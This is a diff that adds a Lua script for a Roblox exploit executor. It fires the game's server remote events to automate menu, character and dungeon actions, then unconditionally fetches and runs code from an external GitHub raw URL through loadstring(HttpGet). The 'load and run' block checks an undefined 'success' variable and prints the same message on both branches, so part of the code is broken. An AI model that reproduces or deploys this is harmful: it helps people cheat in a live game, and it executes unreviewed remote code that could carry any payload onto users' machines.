@@ -1,1 +1,60 @@
-````
+-- Check for AutoMenu functionality
+if getgenv().AutoMenu then    
+    -- Execute various server calls
+    local args = {
+        [1] = {
+            [1] = {
+                [1] = "\1"
+            },
+            [2] = "2"
+        }
+    }
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))
+    wait(1.5)
+
+    local args = {
+        [1] = {
+            [1] = "ui",
+            [2] = "LeaderboardGui"
+        }
+    }
+    game:GetService("ReplicatedStorage").Utility.AssetRequester.Remote:InvokeServer(unpack(args))
+
+    local args = { [1] = "GetWeapons" }
+    game:GetService("ReplicatedStorage").remotes.getData:InvokeServer(unpack(args))
+    game:GetService("ReplicatedStorage").remotes.reloadInvy:InvokeServer()
+
+    local args = { [1] = "Desert Temple" }
+    game:GetService("ReplicatedStorage").remotes.getDungeonStats:InvokeServer(unpack(args))
+
+    local args = {
+        [1] = {
+            [1] = {
+                [1] = "\1",
+                [2] = {
+                    ["\3"] = "select",
+                    ["characterIndex"] = 1
+                }
+            },
+            [2] = "L"
+        }
+    }
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))   
+
+    wait(0.9)
+
+    -- Load and run the external script
+    print("Executing The Script...")
+
+    -- Check if the loadstring was successful
+    if not success then
+        print("What Happened Bru")
+    else
+        print("What Happened Bru")
+    end
+else
+    print("Macro Successfully Saved and Loaded")
+end
+
+-- Execute this loadstring regardless of AutoMenu state
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hen56s2/test1/refs/heads/main/1"))()
